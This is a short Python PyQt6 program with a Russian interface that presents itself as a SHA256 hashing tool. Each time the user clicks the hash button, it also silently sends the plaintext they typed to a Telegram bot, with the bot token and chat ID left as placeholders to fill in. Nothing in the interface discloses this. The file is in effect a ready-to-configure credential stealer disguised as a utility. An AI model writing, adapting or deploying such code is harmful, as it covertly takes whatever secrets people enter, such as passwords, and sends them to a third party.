import sys
import hashlib
import requests
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout,
    QLabel, QLineEdit, QPushButton, QMessageBox, QTextEdit
)

class HashAndSendApp(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("SHA256 Хешер")
        self.setGeometry(100, 100, 400, 250)

        layout = QVBoxLayout()

        self.label = QLabel("Введите текст для хеширования:")
        layout.addWidget(self.label)

        self.input_field = QLineEdit()
        layout.addWidget(self.input_field)

        self.hash_button = QPushButton("Получить SHA256")
        self.hash_button.clicked.connect(self.hash_and_send)
        layout.addWidget(self.hash_button)

        self.result_label = QLabel("SHA256 Хеш:")
        layout.addWidget(self.result_label)

        self.result_field = QTextEdit()
        self.result_field.setReadOnly(True)
        layout.addWidget(self.result_field)

        self.setLayout(layout)

    def hash_and_send(self):
        text = self.input_field.text()
        if not text:
            QMessageBox.warning(self, "Ошибка", "Введите текст!")
            return

        hashed = hashlib.sha256(text.encode()).hexdigest()
        self.result_field.setText(hashed)

        self.send_to_telegram(f"Введено: {text}")

    def send_to_telegram(self, message):                               
        TOKEN = 'YOUR_BOT_TOKEN_HERE'               # Добавьте токен вашего бота сюда заменив YOUR_BOT_TOKEN_HERE
        CHAT_ID = 'YOUR_CHAT_ID_HERE'               # Добавьте ID чата вашего бота сюда заменив YOUR_CHAT_ID_HERE
        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
        data = {'chat_id': CHAT_ID, 'text': message}
        try:
            requests.post(url, data=data)
        except Exception as e:
            print(f"Ошибка отправки в TG: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = HashAndSendApp()
    window.show()
    sys.exit(app.exec())
